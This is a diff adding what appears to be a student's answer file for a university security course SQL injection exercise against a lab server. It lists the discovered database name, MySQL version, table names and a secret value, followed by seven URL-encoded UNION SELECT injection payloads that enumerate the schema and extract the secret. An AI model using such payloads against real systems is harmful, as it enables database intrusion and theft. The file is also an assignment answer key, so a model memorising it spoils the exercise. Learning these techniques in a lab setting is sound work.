@@ -1,0 +1,13 @@
+proj2_inject3
+5.5.60-0ubuntu0.14.04.1
+HINT, SECRET, foo, inject3_users
+lacrimal
+
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=1%27+AND+1%3C0+UNION+SELECT+1+as+placeholder1%2C+DATABASE%28%29+as+firstName%2C+3+as+placeholder3%2C+DATABASE%28%29+as+lastName+FROM+DUAL%3B+--+ 
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=1%27+AND+1%3C0+UNION+SELECT+1+as+placeholder1%2C+VERSION%28%29+as+firstName%2C+3+as+placeholder3%2C+VERSION%28%29+as+lastName+FROM+DUAL%3B+--+ 
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=1%27+AND+1%3C0+UNION+SELECT+1+as+placeholder1%2C+table_name+as+firstName%2C+3+as+placeholder3%2C+4+as+lastName+FROM+information_schema.tables+WHERE+table_schema%3D%27proj2_inject3%27%3B+--+ 
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=1%27+AND+1%3C0+UNION+SELECT+1+as+placeholder1%2C+table_name+as+firstName%2C+3+as+placeholder3%2C+4+as+lastName+FROM+information_schema.tables+WHERE+table_schema%3D%27proj2_inject3%27+AND+table_name+%21%3D+%27HINT%27%3B+--+ 
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=1%27+AND+1%3C0+UNION+SELECT+1+as+placeholder1%2C+table_name+as+firstName%2C+3+as+placeholder3%2C+4+as+lastName+FROM+information_schema.tables+WHERE+table_schema%3D%27proj2_inject3%27+AND+table_name+%21%3D+%27HINT%27+AND+table_name+%21%3D+%27SECRET%27%3B+--+ 
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=1%27+AND+1%3C0+UNION+SELECT+1+as+placeholder1%2C+table_name+as+firstName%2C+3+as+placeholder3%2C+4+as+lastName+FROM+information_schema.tables+WHERE+table_schema%3D%27proj2_inject3%27+AND+table_name+%21%3D+%27HINT%27+AND+table_name+%21%3D+%27SECRET%27+AND+table_name+%21%3D+%27foo%27%3B+--+ 
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=1%27+AND+1%3C0+UNION+SELECT+1+as+placeholder1%2C+secret+as+first_name%2C+3+as+placeholder3%2C+id+as+last_name+FROM+SECRET+WHERE+id+%3D+95%3B+--+ 
+
